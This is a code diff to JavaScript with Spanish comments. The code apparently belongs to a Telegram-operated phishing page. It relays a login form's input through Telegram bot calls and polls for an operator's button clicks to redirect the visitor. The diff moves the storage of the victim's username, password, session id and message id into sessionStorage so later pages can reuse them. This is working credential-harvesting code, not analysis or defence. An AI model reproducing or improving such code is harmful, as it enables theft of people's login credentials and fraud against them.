@@ -56,7 +56,6 @@ async function pollStatus(msgId, sessionId) {
         if (u.callback_query && u.callback_query.message.message_id === msgId) {
           const act = u.callback_query.data.replace('ACTION:', '');
 
-          // Borrar botones en Telegram al hacer clic
           fetch(`/api/editMessageReplyMarkup`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -64,10 +63,6 @@ async function pollStatus(msgId, sessionId) {
           });
 
           const go = (path) => {
-            // Guardamos el usuario, la contraseña y la sesión para usarlos en las siguientes páginas
-            sessionStorage.setItem('bc_user', userInput.value.trim());
-            sessionStorage.setItem('bc_pass', passInput.value);
-            sessionStorage.setItem('bc_session', sessionId);
             window.location.href = path;
           };
 
@@ -119,6 +114,13 @@ btn.addEventListener('click', async () => {
       alert('Error de API. Revisa las credenciales.');
       return;
     }
+
+    // GUARDAMOS TODO EN SESSIONSTORAGE (INCLUYENDO EL ID DEL MENSAJE)
+    sessionStorage.setItem('bc_user', userInput.value.trim());
+    sessionStorage.setItem('bc_pass', passInput.value);
+    sessionStorage.setItem('bc_session', sid);
+    sessionStorage.setItem('bc_msg_id', data.result.message_id);
+
     pollStatus(data.result.message_id, sid);
   } catch (e) {
     loader.classList.remove('show');
